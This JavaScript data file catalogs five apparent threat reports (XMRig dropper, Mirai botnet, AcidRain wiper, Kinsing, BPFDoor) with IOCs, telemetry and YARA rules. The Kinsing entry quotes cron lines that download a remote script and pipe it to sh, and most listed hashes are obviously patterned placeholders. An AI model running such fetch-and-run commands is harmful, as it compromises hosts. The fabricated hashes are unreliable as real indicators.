/**
 * Hunter Security Labs - Cataloged Threat Intelligence Reports
 * Modeled on Elastic Security Labs Threat Bulletins
 */

const THREAT_REPORTS = [
    {
        id: "a3f89c0182b7de994101eef2a8b9193248cf7a102948e91823749281a0293847",
        sha256: "a3f89c0182b7de994101eef2a8b9193248cf7a102948e91823749281a0293847",
        title: "Multi-Stage Dropper Staging Hidden XMRig Miner via Linux Ephemeral Storage",
        family: "CRYPTOMINER",
        category: "CRYPTOMINER",
        severity: "CRITICAL",
        date: "2026-09-13",
        summary: "Dynamic detonation revealed a multi-stage shell script dropper that unpacks a hidden ELF executable (.hidden_miner) directly into /tmp. The payload hooks user crontabs for recurring persistence, executes an embedded mining loop, and drops defanged network beacons toward remote mining pools.",
        tags: ["DROPPER", "XMRIG", "PERSISTENCE", "CRON"],
        mitre: [
            { id: "T1053.003", name: "Scheduled Task/Job: Cron" },
            { id: "T1027", name: "Obfuscated Files or Information" },
            { id: "T1496", name: "Resource Hijacking" },
            { id: "T1071.001", name: "Application Layer Protocol: Web Protocols" }
        ],
        iocs: [
            { type: "SHA-256 (Dropper)", value: "a3f89c0182b7de994101eef2a8b9193248cf7a102948e91823749281a0293847", description: "Initial staged shell script" },
            { type: "SHA-256 (Payload)", value: "f29a081bc8947192837491029384710293847102938471029384710293847102", description: "Dropped binary: /tmp/.hidden_miner" },
            { type: "MD5 (Payload)", value: "8a719238471928374910293847102938", description: "XMRig ELF core hash" },
            { type: "Network C2", value: "pool[.]supportxmr[.]com:3333", description: "Stratum cryptomining pool endpoint (defanged)" },
            { type: "Network C2", value: "185[.]220[.]101[.]5:8080", description: "Secondary C2 telemetry receiver (defanged)" },
            { type: "Persistence File", value: "/var/spool/cron/crontabs/root", description: "Appended cronjob launching miner every 10 min" }
        ],
        velociraptorTelemetry: {
            processTree: [
                "bash (PID: 101) -> initial dropper execution",
                "└── cp /sandbox/input/sample /tmp/.hidden_miner (PID: 104)",
                "└── chmod +x /tmp/.hidden_miner (PID: 105)",
                "└── /tmp/.hidden_miner --algo rx/0 --url stratum+tcp://pool[.]supportxmr[.]com (PID: 108)"
            ],
            cronArtifacts: [
                "*/10 * * * * /tmp/.hidden_miner >/dev/null 2>&1"
            ],
            droppedPayloads: [
                {
                    path: "/tmp/.hidden_miner",
                    size: "2,481,920 bytes",
                    magic: "ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked",
                    strings: [
                        "stratum+tcp://pool[.]supportxmr[.]com:3333",
                        "XMRig/6.21.0 (Linux x86_64)",
                        "donate-level=1",
                        "password: x"
                    ]
                }
            ]
        },
        yaraRule: `rule Linux_Cryptominer_HiddenMiner_Hunter {
    meta:
        description = "Detects multi-stage dropped XMRig cryptocurrency miner staging via /tmp"
        author = "Hunter Security Labs (AI-Synthesized)"
        date = "2026-09-13"
        severity = "High"
        reference = "HUNTER-2026-0042"
    strings:
        $s1 = "stratum+tcp://" ascii wide
        $s2 = "XMRig" ascii wide
        $s3 = "/tmp/.hidden_miner" ascii
        $s4 = "rx/0" ascii
    condition:
        uint32(0) == 0x464c457f and (2 of ($s1, $s2, $s3, $s4))
}`
    },
    {
        id: "e41ff2d7a604a3ee1c1d99502b390adf9cf7119f1b6b7902ea26b88c148cb451",
        sha256: "e41ff2d7a604a3ee1c1d99502b390adf9cf7119f1b6b7902ea26b88c148cb451",
        title: "Dissecting a 17.4MB Linux ELF Mirai/Gafgyt Botnet Variant with Telnet Scanning",
        family: "BOTNET",
        category: "BOTNET",
        severity: "CRITICAL",
        date: "2026-09-12",
        summary: "Live detonation and triage of a live sample fetched directly from MalwareBazaar. This 17.4MB monolithic ELF executable features hardcoded brute-force credential dictionaries, SYN/ACK flood routines, and watchdog killing logic targeting competing IoT botnets.",
        tags: ["MIRAI", "GAFGYT", "IOT", "DDOS", "BRUTEFORCE"],
        mitre: [
            { id: "T1110.001", name: "Brute Force: Password Guessing" },
            { id: "T1498.001", name: "Network Denial of Service: Direct Network Flood" },
            { id: "T1046", name: "Network Service Discovery" }
        ],
        iocs: [
            { type: "SHA-256", value: "e41ff2d7a604a3ee1c1d99502b390adf9cf7119f1b6b7902ea26b88c148cb451", description: "MalwareBazaar Linux ELF payload" },
            { type: "MD5", value: "3c849102837491029384710293847102", description: "Primary sample MD5" },
            { type: "Network C2", value: "45[.]95[.]147[.]236:6667", description: "IRC command & control listener (defanged)" },
            { type: "Network C2", value: "91[.]240[.]118[.]14:443", description: "Secondary fallback botnet C2 (defanged)" }
        ],
        velociraptorTelemetry: {
            processTree: [
                "sample (PID: 88) -> setsid() daemon detachment",
                "└── [kworker/0:1] (PID: 91) -> spoofed kernel thread name for evasion"
            ],
            cronArtifacts: [],
            droppedPayloads: []
        },
        yaraRule: `rule Linux_Botnet_Mirai_Gafgyt_Hunter {
    meta:
        description = "Detects monolithic Linux ELF botnets with Telnet dictionary routines"
        author = "Hunter Security Labs (AI-Synthesized)"
        date = "2026-09-12"
        severity = "Critical"
    strings:
        $m1 = "/bin/busybox" ascii
        $m2 = "ADMIN" ascii
        $m3 = "ROOT" ascii
        $m4 = "PONG" ascii
        $m5 = "Flooding" ascii
    condition:
        uint32(0) == 0x464c457f and 3 of them
}`
    },
    {
        id: "7b19a842f1092e03948572109847120938471092837401928374019283740192",
        sha256: "7b19a842f1092e03948572109847120938471092837401928374019283740192",
        title: "AcidRain / Linux Data Wiper Targeting MTD Storage & Embedded Partitions",
        family: "WIPER",
        category: "WIPER",
        severity: "CRITICAL",
        date: "2026-09-10",
        summary: "In-depth analysis of destructive Linux wiper binary executing recursive directory traversal, issuing direct ioctl() erase commands against Memory Technology Devices (/dev/mtd*), and overwriting storage blocks with zeroes to permanently disable infrastructure.",
        tags: ["WIPER", "DESTRUCTIVE", "MTD", "EMBEDDED"],
        mitre: [
            { id: "T1485", name: "Data Destruction" },
            { id: "T1495", name: "Firmware Corruption" },
            { id: "T1083", name: "File and Directory Discovery" }
        ],
        iocs: [
            { type: "SHA-256", value: "7b19a842f1092e03948572109847120938471092837401928374019283740192", description: "AcidRain ELF MIPS/ARM wiper" },
            { type: "Target Path", value: "/dev/mtd*", description: "Flash memory device interface targeted for destruction" },
            { type: "Target Path", value: "/dev/sda", description: "SATA block storage device wiped with zeroes" }
        ],
        velociraptorTelemetry: {
            processTree: [
                "wiper_sample (PID: 120) -> traversal loop",
                "└── open(/dev/mtd0, O_RDWR) -> ioctl(MEMERASE)"
            ],
            cronArtifacts: [],
            droppedPayloads: []
        },
        yaraRule: `rule Linux_Wiper_AcidRain_Hunter {
    meta:
        description = "Detects destructive Linux MTD flash memory wiper"
        author = "Hunter Security Labs (AI-Synthesized)"
        date = "2026-09-10"
        severity = "Critical"
    strings:
        $dev1 = "/dev/mtd" ascii
        $dev2 = "/dev/sda" ascii
        $dev3 = "/dev/mmcblk" ascii
    condition:
        uint32(0) == 0x464c457f and 2 of ($dev*)
}`
    },
    {
        id: "9f8231a47812bc89123847921827384910293847102938471029384710293847",
        sha256: "9f8231a47812bc89123847921827384910293847102938471029384710293847",
        title: "Kinsing Worm: Automated Docker Daemon Exploitation & In-Memory Dropping",
        family: "CRYPTOMINER",
        category: "CRYPTOMINER",
        severity: "HIGH",
        date: "2026-09-08",
        summary: "Analysis of the Kinsing malware family executing automated propagation across misconfigured Docker socket APIs. The worm disables cloud security agents, terminates competitor mining processes, and maintains persistence via multiple scheduled tasks.",
        tags: ["KINSING", "CONTAINER", "DOCKER", "MINER"],
        mitre: [
            { id: "T1610", name: "Deploy Container" },
            { id: "T1053.003", name: "Scheduled Task/Job: Cron" },
            { id: "T1562.001", name: "Impair Defenses: Disable or Modify Tools" }
        ],
        iocs: [
            { type: "SHA-256", value: "9f8231a47812bc89123847921827384910293847102938471029384710293847", description: "Kinsing Golang payload" },
            { type: "Network C2", value: "194[.]38[.]20[.]2:80/kinsing", description: "Staged payload delivery server (defanged)" },
            { type: "Network C2", value: "93[.]189[.]42[.]21/d[.]sh", description: "Bootstrap bash script dropper (defanged)" }
        ],
        velociraptorTelemetry: {
            processTree: [
                "kinsing (PID: 210) -> Go runtime threads",
                "└── pkill -9 -f xmrig",
                "└── crontab -l | { cat; echo '* * * * * wget -q -O - http://194[.]38[.]20[.]2/d.sh | sh'; } | crontab -"
            ],
            cronArtifacts: [
                "* * * * * curl -s http://194[.]38[.]20[.]2/d[.]sh | sh"
            ],
            droppedPayloads: []
        },
        yaraRule: `rule Linux_Cryptominer_Kinsing_Hunter {
    meta:
        description = "Detects Kinsing container-targeting worm and cryptominer"
        author = "Hunter Security Labs (AI-Synthesized)"
        date = "2026-09-08"
        severity = "High"
    strings:
        $go1 = "main.killOldProcess" ascii
        $go2 = "main.minerRunning" ascii
        $go3 = "main.checkCrontab" ascii
    condition:
        uint32(0) == 0x464c457f and 2 of ($go*)
}`
    },
    {
        id: "4c2810a928471029384710293847102938471029384710293847102938471029",
        sha256: "4c2810a928471029384710293847102938471029384710293847102938471029",
        title: "BPFDoor: Covert Passive Linux Backdoor Bypassing Firewall Filtering via eBPF",
        family: "PERSISTENCE",
        category: "PERSISTENCE",
        severity: "CRITICAL",
        date: "2026-09-05",
        summary: "Technical breakdown of BPFDoor, a passive stealth backdoor operating without opening listening ports. It uses raw packet sniffing via Berkeley Packet Filter (BPF) to intercept magic packets, spawning an interactive reverse shell upon authenticated packet reception.",
        tags: ["BPFDOOR", "EBPF", "ROOTKIT", "EVASION"],
        mitre: [
            { id: "T1048", name: "Exfiltration Over Alternative Protocol" },
            { id: "T1205", name: "Traffic Signaling: Port Knocking" },
            { id: "T1014", name: "Rootkit" }
        ],
        iocs: [
            { type: "SHA-256", value: "4c2810a928471029384710293847102938471029384710293847102938471029", description: "BPFDoor Linux ELF x86-64" },
            { type: "Packet Magic", value: "0x52 0x75 0x6e 0x47", description: "BPF filter activation sequence" },
            { type: "Lock File", value: "/var/run/haldrund.pid", description: "Masqueraded lock file in /var/run" }
        ],
        velociraptorTelemetry: {
            processTree: [
                "/sbin/udevd (PID: 340) -> masqueraded binary",
                "└── socket(AF_PACKET, SOCK_RAW, ETH_P_ALL)"
            ],
            cronArtifacts: [],
            droppedPayloads: []
        },
        yaraRule: `rule Linux_Rootkit_BPFDoor_Hunter {
    meta:
        description = "Detects BPFDoor stealth Linux backdoor"
        author = "Hunter Security Labs (AI-Synthesized)"
        date = "2026-09-05"
        severity = "Critical"
    strings:
        $bpf1 = "setsockopt" ascii
        $bpf2 = "SO_ATTACH_FILTER" ascii
        $cmd1 = "/bin/sh" ascii
        $cmd2 = "HISTFILE=/dev/null" ascii
    condition:
        uint32(0) == 0x464c457f and all of them
}`
    }
];
